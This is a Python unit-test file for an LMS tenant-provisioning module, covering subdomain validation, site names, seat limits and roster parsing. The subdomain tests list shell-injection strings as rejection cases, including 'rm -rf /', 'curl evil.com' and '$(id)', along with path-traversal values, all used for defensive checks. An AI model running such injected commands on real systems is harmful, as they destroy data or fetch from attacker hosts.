# Copyright (c) 2026, Frappe and contributors
# For license information, please see license.txt

"""Unit tests for tenant provisioning rules (ADR-0001 site-per-tenant, §1.3).

The subdomain validator guards a value that reaches ``bench new-site`` as a
subprocess argument, so its rejection cases are security tests, not
cosmetics.

Pure tests — no Frappe site required:
	python -m unittest lms.tests.language_platform.test_tenant_rules
"""

import unittest

from lms.lms.language_platform.tenant_rules import (
	RESERVED_SUBDOMAINS,
	TenantNameError,
	build_site_name,
	check_seat_capacity,
	normalize_roster_row,
	parse_roster,
	seats_available,
	validate_roster_row,
	validate_subdomain,
)


class TestSubdomainValidation(unittest.TestCase):
	def test_accepts_ordinary_names(self):
		for name in ("kolej", "ankara-koleji", "abc", "a1b2c3", "x" * 63):
			self.assertEqual(validate_subdomain(name), name)

	def test_normalizes_case_and_whitespace(self):
		self.assertEqual(validate_subdomain("  AnkaraKoleji  "), "ankarakoleji")

	def test_rejects_shell_metacharacters(self):
		# These would be catastrophic if they reached `bench new-site`.
		for payload in (
			"tenant;rm -rf /",
			"tenant && curl evil.com",
			"tenant|whoami",
			"tenant$(id)",
			"tenant`id`",
			"tenant\nrm -rf /",
			"tenant with space",
			"tenant'quote",
			'tenant"quote',
		):
			with self.assertRaises(TenantNameError, msg=f"accepted {payload!r}"):
				validate_subdomain(payload)

	def test_rejects_path_traversal(self):
		for payload in ("../etc", "..", "a/../b", "tenant/sub", "/absolute"):
			with self.assertRaises(TenantNameError, msg=f"accepted {payload!r}"):
				validate_subdomain(payload)

	def test_rejects_leading_or_trailing_hyphen(self):
		for name in ("-tenant", "tenant-", "-"):
			with self.assertRaises(TenantNameError):
				validate_subdomain(name)

	def test_rejects_too_short_or_too_long(self):
		with self.assertRaises(TenantNameError):
			validate_subdomain("ab")
		with self.assertRaises(TenantNameError):
			validate_subdomain("x" * 64)

	def test_rejects_punycode_prefix(self):
		# Would let a tenant claim a name that renders as another brand.
		with self.assertRaises(TenantNameError):
			validate_subdomain("xn--80ak6aa92e")

	def test_rejects_reserved_names(self):
		for name in ("www", "api", "admin", "owner", "vod", "app"):
			self.assertIn(name, RESERVED_SUBDOMAINS)
			with self.assertRaises(TenantNameError):
				validate_subdomain(name)

	def test_rejects_empty_and_non_string(self):
		for value in ("", "   ", None, 123, [], {}):
			with self.assertRaises(TenantNameError):
				validate_subdomain(value)

	def test_rejects_unicode_lookalikes(self):
		# Cyrillic 'а' renders like Latin 'a' but is a different codepoint.
		with self.assertRaises(TenantNameError):
			validate_subdomain("tenаnt")


class TestSiteName(unittest.TestCase):
	def test_builds_hostname(self):
		self.assertEqual(
			build_site_name("kolej", "dilplatformu.com"), "kolej.dilplatformu.com"
		)

	def test_normalizes_base_domain(self):
		self.assertEqual(
			build_site_name("kolej", "  DilPlatformu.COM. "), "kolej.dilplatformu.com"
		)

	def test_rejects_bad_base_domain(self):
		for base in ("", None, "bad domain.com", "domain;rm -rf /"):
			with self.assertRaises(TenantNameError):
				build_site_name("kolej", base)

	def test_propagates_subdomain_validation(self):
		with self.assertRaises(TenantNameError):
			build_site_name("www", "dilplatformu.com")


class TestSeatCapacity(unittest.TestCase):
	def test_available_seats(self):
		self.assertEqual(seats_available(500, 120), 380)
		self.assertEqual(seats_available(500, 500), 0)
		self.assertEqual(seats_available(500, 600), 0)  # never negative

	def test_zero_limit_means_unlimited(self):
		self.assertEqual(seats_available(0, 10_000), -1)
		self.assertEqual(seats_available(None, 10_000), -1)

	def test_check_allows_within_limit(self):
		check_seat_capacity(500, 100, 400)  # exactly fills

	def test_check_rejects_overflow(self):
		with self.assertRaises(ValueError) as ctx:
			check_seat_capacity(500, 100, 401)
		self.assertIn("Seat limit exceeded", str(ctx.exception))

	def test_check_ignores_unlimited(self):
		check_seat_capacity(0, 10_000, 5_000)


class TestRosterParsing(unittest.TestCase):
	def test_normalizes_headers_and_values(self):
		row = normalize_roster_row(
			{"  E-Mail ": " A@B.COM ", "First Name": " Ada ", "level": "b1"}
		)
		# header spaces become underscores, email lowercased, level uppercased
		self.assertEqual(row["first_name"], "Ada")
		self.assertEqual(row["level"], "B1")

	def test_email_lowercased(self):
		row = normalize_roster_row({"email": " Student@School.EDU "})
		self.assertEqual(row["email"], "student@school.edu")

	def test_requires_email_and_first_name(self):
		self.assertIn("'email' is required", validate_roster_row({"first_name": "Ada"}))
		self.assertIn(
			"'first_name' is required", validate_roster_row({"email": "a@b.com"})
		)

	def test_rejects_malformed_email(self):
		errors = validate_roster_row({"email": "not-an-email", "first_name": "Ada"})
		self.assertTrue(any("valid email" in e for e in errors))

	def test_rejects_bad_level(self):
		errors = validate_roster_row({"email": "a@b.com", "first_name": "Ada", "level": "Z9"})
		self.assertTrue(any("CEFR" in e for e in errors))

	def test_accepts_good_row(self):
		self.assertEqual(
			validate_roster_row({"email": "a@b.com", "first_name": "Ada", "level": "B1"}), []
		)

	def test_parse_splits_valid_and_invalid(self):
		valid, errors = parse_roster(
			[
				{"email": "a@b.com", "first_name": "Ada"},
				{"email": "bad", "first_name": "Bob"},
				{"email": "c@d.com", "first_name": ""},
			]
		)
		self.assertEqual(len(valid), 1)
		self.assertEqual(len(errors), 2)

	def test_errors_carry_spreadsheet_row_numbers(self):
		_, errors = parse_roster(
			[{"email": "a@b.com", "first_name": "Ada"}, {"email": "bad", "first_name": "Bob"}]
		)
		self.assertEqual(errors[0]["row"], 2)

	def test_duplicate_emails_are_rejected_not_deduplicated(self):
		# Two rows with one address usually means two people were conflated;
		# importing one silently would hide the mistake.
		valid, errors = parse_roster(
			[
				{"email": "a@b.com", "first_name": "Ada"},
				{"email": "A@B.com", "first_name": "Adam"},
			]
		)
		self.assertEqual(len(valid), 1)
		self.assertEqual(len(errors), 1)
		self.assertTrue(any("duplicate" in e for e in errors[0]["errors"]))

	def test_empty_roster(self):
		self.assertEqual(parse_roster([]), ([], []))
		self.assertEqual(parse_roster(None), ([], []))


if __name__ == "__main__":
	unittest.main()
